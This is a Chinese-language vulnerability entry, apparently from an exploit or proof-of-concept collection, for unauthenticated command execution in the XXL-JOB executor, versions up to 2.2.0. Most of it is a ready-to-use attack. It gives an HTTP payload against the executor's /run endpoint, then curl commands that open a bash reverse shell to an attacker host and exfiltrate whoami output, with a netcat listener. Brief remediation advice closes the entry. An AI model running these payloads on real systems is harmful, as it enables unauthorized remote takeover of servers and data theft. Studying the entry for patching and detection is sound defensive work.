---
id: XXL-JOB-UNACC
title: XXL-JOB executor 未授权访问漏洞
product: xxl-job
vendor: XXL-JOB
version_affected: "<= 2.2.0"
severity: CRITICAL
tags: [rce, 无需认证]
fingerprint: ["XXL-JOB"]
---

## 漏洞描述

XXL-JOB 是一个分布式任务调度平台，分为 admin 和 executor 两端，前者为后台管理页面，后者是任务执行的客户端。executor 默认没有配置认证，未授权的攻击者可以通过 RESTful API 执行任意命令。

## 影响版本

- XXL-JOB <= 2.2.0

## 前置条件

- 无需认证
- 需要能够访问 executor 端口（默认 9999）

## 利用步骤

1. 向 executor 发送恶意任务
2. 利用 GLUE_SHELL 执行命令

## Payload

```http
POST /run HTTP/1.1
Host: target:9999
Content-Type: application/json

{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "glueType": "GLUE_SHELL",
  "glueSource": "touch /tmp/success"
}
```

## 验证方法

```bash
# 此漏洞为RCE via GLUE_SHELL，需要使用反弹shell或HTTP外带验证
# 攻击者服务器启动监听
nc -lvp 4444

# 使用反弹shell payload
curl -X POST "http://target:9999/run" \
  -H "Content-Type: application/json" \
  -d '{
    "jobId": 1,
    "executorHandler": "demoJobHandler",
    "executorParams": "demoJobHandler",
    "glueType": "GLUE_SHELL",
    "glueSource": "bash -i >& /dev/tcp/attacker-ip/4444 0>&1"
  }'

# 或使用HTTP外带验证（推荐，攻击者服务器启动: python3 -m http.server 8080）
curl -X POST "http://target:9999/run" \
  -H "Content-Type: application/json" \
  -d '{
    "jobId": 1,
    "executorHandler": "demoJobHandler",
    "executorParams": "demoJobHandler",
    "glueType": "GLUE_SHELL",
    "glueSource": "curl http://attacker-ip:8080/$(whoami)"
  }'
# 检查HTTP服务器日志是否有回连
```

## 修复建议

1. 升级 XXL-JOB 至最新版本
2. 为 executor 配置认证
3. 限制 executor 端口访问来源
